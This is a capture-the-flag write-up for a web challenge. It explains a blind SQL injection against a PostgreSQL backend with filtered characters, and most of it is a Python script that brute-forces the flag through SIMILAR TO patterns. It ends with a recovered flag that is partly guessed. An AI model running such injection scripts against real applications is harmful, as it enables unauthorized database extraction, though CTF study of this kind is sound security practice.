this is some classic blind sqli with filtering of all characters that are not alphabets,numbers or the characters ' _ { }

The challenge also uses a Postgre backend so we need to use its corresponding queries
Hence all I did is use the ``` SIMILAR TO ``` query to guess the characters.
here is the python script I wrote in order to solve the challenge
```
import requests

url = "https://penguin.chall.lac.tf/submit"
payloadinit = "' or name similar to 'lactf{"
payload = ""
underscores = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_"
flag = ""
un=0
for i in range(0,100):
    underscores += '_'
    un += 1
    r = requests.post(url,data={"username":payloadinit + underscores})
    if r.status_code == 200:
        print(payloadinit + underscores)
        break
try:
    for i in range(un):
        underscores = ""
        for k in range(un - i - 1):         #since we're keeping the closing bracket instead of the _ in the end, I reduced the number of underscores by 1
            underscores += '_'
        for j in range(len(charset)):
            payload = payloadinit + flag + charset[j] + underscores + '}'
            r = requests.post(url,data={"username":payload})
            if r.status_code == 200:
                print("found=>" + payload)
                print("yaay")
                flag += charset[j]
                break
            else:
                print("\r" + payload, end="")
except KeyboardInterrupt:
    print(r.text)
    print(payload)

    #lactf{_0stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}      => idk why but this was the flag I got from running the script but by guesswork, I figured the flag should be
    #lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}

```
